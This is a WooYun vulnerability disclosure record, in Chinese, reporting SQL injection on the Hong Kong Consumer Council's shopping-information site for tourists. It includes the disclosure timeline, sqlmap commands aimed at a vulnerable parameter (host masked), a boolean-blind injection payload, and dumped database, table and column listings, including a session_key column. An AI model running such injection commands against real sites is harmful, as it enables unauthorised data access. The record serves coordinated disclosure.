{"id": 80003, "wybug_id": "wooyun-2015-0156860", "wybug_title": "精明消費香港遊某处存在SQL注射漏洞（308W session_key泄露）（香港地區）", "wybug_corp": "精明消費香港遊", "wybug_author": "路人甲", "wybug_date": "2015-12-01 23:26", "wybug_open_date": "2016-01-17 11:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(hkcert香港互联网应急协调中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向公众公开  简要描述： 精明消費香港遊 香港一向有「購物天堂」的美譽，每年均吸引大量遊客來港購物。為了讓旅客在香港放心購物，香港消費者委員會特地設立一個資訊網站「精明消費香港遊」，為各位旅客提供購物資訊，助你了解香港的消費文化，及在港消費可獲得的保障等等。  一站式消費資訊 我們希望為旅客提供一站式的消費資訊，從消費者的角度出發，為遊客搜集來港消費購物等多方面的資訊。譬如出發前如何選擇旅行社及旅遊保險，便非常重要。來港購物前做好資料搜集，方可確保玩得開心、稱心。  熱門商品選購提示 在購物方面，我們集中介紹一些熱門的消費品及服務行業的選購提示，包括珠寶表飾、電子產品、參茸海味、零食及巧克力、化妝品、奶粉、藥品、個人護理用品、皮具及服飾、美容服務等等。部份較受歡迎的電子產品研究報告，如手機、數碼相機等，更設有產品比較及排序功能。另外，旅客在購買個別商品時可能遇到的不良銷售手法，亦會在此作出提示。  介紹中港兩地差異 特別一提的是，網站也提醒旅客，香港與內地兩地的差異，諸如法例、消費上的慣常做法等，協助旅客掌握來港消費的竅門。舉例來說，香港沒有一條像內地的綜合保障消費者的《消保法》，而是按個別情況訂立法例，如《消費品安全條例》，同時依靠競爭，使經營者提供優質商品和服務。  保障旅客購物措施 除了法例外，香港也有不少措施保障旅客在港購物的權益。香港旅遊發展局有「優質旅遊服務計劃」（QTS），被認可商家貼有「優」字標誌，確保明碼實價，貨真價實。香港知識產權署推行「正版正貨承諾計劃」，參與商家貼有「正」字標誌，保證商品為正版正貨。 此外，香港旅遊業議會設有「入境旅行團（登記店舖）購物退款保障計劃」，凡經由該會會員旅行社安排前往登記店舖購物的團體旅客，都可得到百分百退款保障。旅客購物後如有不滿，只要於六個月（內地旅客）或14天（海外旅客）內提出退款要求，均可獲全數退款。旅客須憑單據正本辦理退款，而有關貨品必須沒有損壞，也沒有因使用而導致的損耗。 如果在香港消費期間覺得遇到不公平的交易，網站也提供了投訴或尋求調解的方法。  中國消費者協會積極提供協助 有賴中國消費者協會在網站內容上提供意見，讓我們更能夠掌握內地來港旅客的實際需要，也感謝中國消費者協會充當橋樑，向內地各省市的消費者協會推廣本網站，令廣大內地旅客可以第一時間接觸來港消費的資訊。  預祝你有一個愉快的旅程！ 希望遊客瀏覽這個網站後，對香港有進一步的認識，也更有親切感。 最後，祝願大家享受一個愉快的香港遊！ 详细说明：  地址：http://**.**.**.**/shopsmart/index.php/Shopping/viewReport?module=1&first_cate_id=20400&product_id=32&attribute_id=3&report_id=88\n$ python sqlmap.py -u \"http://**.**.**.**/shopsmart/index.php/Shopping/viewReport?module=1&first_cate_id=20400&product_id=32&attribute_id=3&report_id=88\" -p first_cate_id --technique=B --random-agent --batch --count\n\n$ python sqlmap.py -u \"http://**.**.**.**/shopsmart/index.php/Shopping/viewReport?module=1&first_cate_id=20400&product_id=32&attribute_id=3&report_id=88\" -p first_cate_id --technique=B --random-agent --batch -D consumer_db -T ss_report_detail --columns\n\nDatabase: consumer_db+---------------------------------------+---------+| Table                                 | Entries |+---------------------------------------+---------+| ss_report_detail                      | 3085696 |\n证明即可，未深入。\nDatabase: consumer_dbTable: ss_report_detail[19 columns]+---------------------+---------------+| Column              | Type          |+---------------------+---------------+| session_key         | varchar(1000) |\n   漏洞证明：  \n---Parameter: first_cate_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: module=1&first_cate_id=20400 AND 6183=6183&product_id=32&attribute_id=3&report_id=88---web application technology: Apacheback-end DBMS: MySQL >= 5.0.0current user:    'consumer_ad@%'current user is DBA:    Falsedatabase management system users [1]:[*] 'consumer_ad'@'%'Database: information_schema+---------------------------------------+---------+| Table                                 | Entries |+---------------------------------------+---------+| COLUMNS                               | 679     || COLLATION_CHARACTER_SET_APPLICABILITY | 126     || COLLATIONS                            | 126     || TABLES                                | 62      || STATISTICS                            | 60      || KEY_COLUMN_USAGE                      | 42      || TABLE_CONSTRAINTS                     | 41      || CHARACTER_SETS                        | 36      || SCHEMA_PRIVILEGES                     | 16      || VIEWS                                 | 4       || ROUTINES                              | 3       || SCHEMATA                              | 2       || USER_PRIVILEGES                       | 1       |+---------------------------------------+---------+Database: consumer_db+---------------------------------------+---------+| Table                                 | Entries |+---------------------------------------+---------+| ss_report_detail                      | 3085696 || ss_visit_content_topn_ip_location     | 594907  || ss_product_visit_ip_location          | 317088  || ss_visit_content_topn                 | 131715  || ss_product_visit                      | 58680   || ss_report_search_detail               | 28223   || ss_test_product_attribute_content     | 24625   || ss_visit_monthly_ip_location          | 8810    || ss_test_report_picture                | 1754    || ss_test_product                       | 1446    || ss_test_product_attribute             | 1099    || ss_agent_front                        | 912     || ss_agent                              | 577     || seach_view_agent                      | 523     || seach_view_agent_2                    | 523     || sys_ref_role_resource                 | 318     || ss_picture                            | 315     || ss_surveys_result_detail              | 268     || seach_view                            | 253     || seach_view_bak                        | 231     || ss_search_key                         | 182     || ss_article                            | 178     || ss_article_front                      | 176     || sys_resource                          | 167     || ss_ref_product_attribute              | 101     || ss_ref_product_attribute_front        | 98      || ss_product_article_front              | 66      || ss_test_report                        | 64      || ss_product_article                    | 51      || ss_surveys_questions_answer           | 49      || ss_surveys_result                     | 47      || ss_product                            | 45      || ss_product_front                      | 44      || ss_category                           | 43      || ss_visit_monthly                      | 26      || ss_surveys_questions                  | 12      || ss_product_attribute                  | 8       || ss_page_content                       | 7       || ss_page_content_front                 | 7       || sys_ref_user_role                     | 6       || sys_user                              | 6       || sys_role                              | 5       || ss_home_setting                       | 1       || ss_surveys                            | 1       |+---------------------------------------+---------+sqlmap resumed the following injection point(s) from stored session:---Parameter: first_cate_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: module=1&first_cate_id=20400 AND 6183=6183&product_id=32&attribute_id=3&report_id=88---web application technology: Apacheback-end DBMS: MySQL 5Database: consumer_dbTable: ss_report_detail[19 columns]+---------------------+---------------+| Column              | Type          |+---------------------+---------------+| version             | int(11)       || access_url          | text          || category_id_one     | bigint(20)    || category_id_two     | bigint(20)    || city                | varchar(100)  || content_id_one      | bigint(20)    || content_id_two      | bigint(20)    || content_type_one    | int(11)       || content_type_two    | int(11)       || country             | varchar(100)  || create_datetime     | datetime      || id                  | bigint(20)    || memo                | varchar(500)  || module_id           | bigint(20)    || province            | varchar(100)  || session_key         | varchar(1000) || terminal_ip         | varchar(100)  || terminal_type       | int(11)       || terminal_user_agent | varchar(1000) |+---------------------+---------------+\n   修复方案：  上WAF。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-12-03 11:13 厂商回复： Referred to related parties. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}